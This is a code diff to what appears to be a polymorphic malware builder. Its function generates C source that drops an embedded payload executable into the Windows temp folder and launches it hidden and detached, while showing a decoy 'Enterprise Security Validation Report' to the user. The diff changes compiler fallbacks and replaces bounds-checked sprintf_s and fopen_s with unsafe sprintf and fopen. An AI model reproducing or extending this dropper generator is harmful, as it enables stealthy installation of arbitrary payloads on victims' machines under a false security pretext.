@@ -76,9 +76,9 @@ int VS2022_AutoCompile(const char* sourceFile, const char* outputFile) {
     // Method 1: Visual Studio 2022 (Primary) - Enhanced for larger executables
     sprintf_s(compileCmd, sizeof(compileCmd),
         "\"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Tools\\MSVC\\14.37.32822\\bin\\Hostx64\\x64\\cl.exe\" "
-        "/nologo /O1 /MT /std:c++17 /EHsc /bigobj \"%s\" /Fe:\"%s\" "
-        "/link /SUBSYSTEM:WINDOWS /LARGEADDRESSAWARE /DYNAMICBASE /NXCOMPAT "
-        "user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib ole32.lib >nul 2>&1",
+        "/nologo /O1 /MD /std:c++17 /EHsc /bigobj /D_CRT_SECURE_NO_WARNINGS \"%s\" /Fe:\"%s\" "
+        "/link /SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup /LARGEADDRESSAWARE /DYNAMICBASE /NXCOMPAT "
+        "user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib ole32.lib msvcrt.lib vcruntime140.lib ucrt.lib >nul 2>&1",
         sourceFile, outputFile);
     result = system(compileCmd);
     
@@ -86,9 +86,9 @@ int VS2022_AutoCompile(const char* sourceFile, const char* outputFile) {
         // Method 2: VS2022 Enterprise
         sprintf_s(compileCmd, sizeof(compileCmd),
             "\"C:\\Program Files\\Microsoft Visual Studio\\2022\\Enterprise\\VC\\Tools\\MSVC\\14.37.32822\\bin\\Hostx64\\x64\\cl.exe\" "
-            "/nologo /O1 /MT /std:c++17 /EHsc /bigobj \"%s\" /Fe:\"%s\" "
-            "/link /SUBSYSTEM:WINDOWS /LARGEADDRESSAWARE /DYNAMICBASE /NXCOMPAT "
-            "user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib ole32.lib >nul 2>&1",
+            "/nologo /O1 /MD /std:c++17 /EHsc /bigobj /D_CRT_SECURE_NO_WARNINGS \"%s\" /Fe:\"%s\" "
+            "/link /SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup /LARGEADDRESSAWARE /DYNAMICBASE /NXCOMPAT "
+            "user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib ole32.lib msvcrt.lib >nul 2>&1",
             sourceFile, outputFile);
         result = system(compileCmd);
     }
@@ -97,9 +97,9 @@ int VS2022_AutoCompile(const char* sourceFile, const char* outputFile) {
         // Method 3: VS2022 Professional
         sprintf_s(compileCmd, sizeof(compileCmd),
             "\"C:\\Program Files\\Microsoft Visual Studio\\2022\\Professional\\VC\\Tools\\MSVC\\14.37.32822\\bin\\Hostx64\\x64\\cl.exe\" "
-            "/nologo /O1 /MT /std:c++17 /EHsc /bigobj \"%s\" /Fe:\"%s\" "
-            "/link /SUBSYSTEM:WINDOWS /LARGEADDRESSAWARE /DYNAMICBASE /NXCOMPAT "
-            "user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib ole32.lib >nul 2>&1",
+            "/nologo /O1 /MD /std:c++17 /EHsc /bigobj /D_CRT_SECURE_NO_WARNINGS \"%s\" /Fe:\"%s\" "
+            "/link /SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup /LARGEADDRESSAWARE /DYNAMICBASE /NXCOMPAT "
+            "user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib ole32.lib msvcrt.lib >nul 2>&1",
             sourceFile, outputFile);
         result = system(compileCmd);
     }
@@ -107,9 +107,9 @@ int VS2022_AutoCompile(const char* sourceFile, const char* outputFile) {
     if (result != 0) {
         // Method 4: Generic VS2022 cl.exe in PATH
         sprintf_s(compileCmd, sizeof(compileCmd),
-            "cl.exe /nologo /O1 /MT /std:c++17 /EHsc /bigobj \"%s\" /Fe:\"%s\" "
-            "/link /SUBSYSTEM:WINDOWS /LARGEADDRESSAWARE /DYNAMICBASE /NXCOMPAT "
-            "user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib ole32.lib >nul 2>&1",
+            "cl.exe /nologo /O1 /MD /std:c++17 /EHsc /bigobj /D_CRT_SECURE_NO_WARNINGS \"%s\" /Fe:\"%s\" "
+            "/link /SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup /LARGEADDRESSAWARE /DYNAMICBASE /NXCOMPAT "
+            "user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib ole32.lib msvcrt.lib >nul 2>&1",
             sourceFile, outputFile);
         result = system(compileCmd);
     }
@@ -117,8 +117,8 @@ int VS2022_AutoCompile(const char* sourceFile, const char* outputFile) {
     if (result != 0) {
         // Method 5: Enhanced MinGW fallback for larger executables
         sprintf_s(compileCmd, sizeof(compileCmd),
-            "gcc -O2 -static-libgcc -static-libstdc++ -mwindows \"%s\" -o \"%s\" "
-            "-luser32 -lkernel32 -lgdi32 -ladvapi32 -lshell32 -lole32 -Wl,--enable-stdcall-fixup >nul 2>&1",
+            "gcc -O2 -static-libgcc -mwindows -D_CRT_SECURE_NO_WARNINGS \"%s\" -o \"%s\" "
+            "-luser32 -lkernel32 -lgdi32 -ladvapi32 -lshell32 -lole32 -lmsvcrt -Wl,--enable-stdcall-fixup >nul 2>&1",
             sourceFile, outputFile);
         result = system(compileCmd);
     }
@@ -360,11 +360,11 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
                     "    char temp_path[MAX_PATH];\n"
                     "    GetTempPathA(MAX_PATH, temp_path);\n"
                     "    char temp_file[MAX_PATH];\n"
-                    "    sprintf_s(temp_file, MAX_PATH, \"%s\\\\enterprise_payload_%lu.exe\", temp_path, GetTickCount());\n"
+                    "    sprintf(temp_file, \"%s\\\\enterprise_payload_%lu.exe\", temp_path, GetTickCount());\n"
                     "    \n"
                     "    // Write actual payload data to file (only the real payload, not padding)\n"
                     "    FILE* payload_file = nullptr;\n"
-                    "    fopen_s(&payload_file, temp_file, \"wb\");\n"
+                    "    payload_file = fopen(temp_file, \"wb\");\n"
                     "    if (payload_file) {\n"
                     "        fwrite(embedded_payload_data, 1, PAYLOAD_SIZE, payload_file);\n"
                     "        fclose(payload_file);\n"
@@ -384,7 +384,7 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
                     "                si.wShowWindow = SW_HIDE;\n"
                     "                \n"
                     "                char cmdLine[MAX_PATH + 32];\n"
-                    "                sprintf_s(cmdLine, sizeof(cmdLine), \"\\\"%s\\\"\", temp_file);\n"
+                    "                sprintf(cmdLine, \"\\\"%s\\\"\", temp_file);\n"
                     "                \n"
                     "                if (CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, \n"
                     "                                 CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si, &pi)) {\n"
@@ -428,7 +428,7 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
                     "        if (i % 1000 == 0) Sleep(1); // Realistic processing delay\n"
                     "    }\n"
                     "    \n"
-                    "    sprintf_s(system_info, sizeof(system_info),\n"
+                    "    sprintf(system_info,\n"
                     "              \"Enterprise Security Validation Report\\n\\n\"\n"
                     "              \"Status: VALIDATED (Code: %d)\\n\"\n"
                     "              \"Timestamp: %lu\\n\"\n"
@@ -532,13 +532,12 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
 
     // Generate complete VS2022 compatible source code
     sprintf_s(sourceCode, maxSize,
+        "#define _CRT_SECURE_NO_WARNINGS\n"
         "#include <windows.h>\n"
         "#include <stdio.h>\n"
         "#include <stdlib.h>\n"
         "#include <string.h>\n"
         "#include <time.h>\n"
-        "#include <iostream>\n"
-        "#include <string>\n"
         "%s"
         "\n"
         "%s"
@@ -618,7 +617,8 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
         "    %s(validation_data, strlen(validation_data), security_key_primary_%s, 32);\n"
         "}\n"
         "\n"
-        "int main() {\n"
+        "// WinMain entry point for proper Windows subsystem\n"
+        "int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n"
         "    // Initialize VS2022 polymorphic security system\n"
         "    srand((unsigned int)(GetTickCount() ^ GetCurrentProcessId() ^ (DWORD_PTR)GetModuleHandleA(NULL)));\n"
         "    \n"
@@ -645,6 +645,11 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
         "        MB_OK | MB_ICONINFORMATION);\n"
         "    \n"
         "    return 0;\n"
+        "}\n"
+        "\n"
+        "// Alternative main entry point for CRT initialization\n"
+        "int main(int argc, char* argv[]) {\n"
+        "    return WinMain(GetModuleHandle(NULL), NULL, GetCommandLineA(), SW_SHOWNORMAL);\n"
         "}\n",
         
         deliveryIncludes,
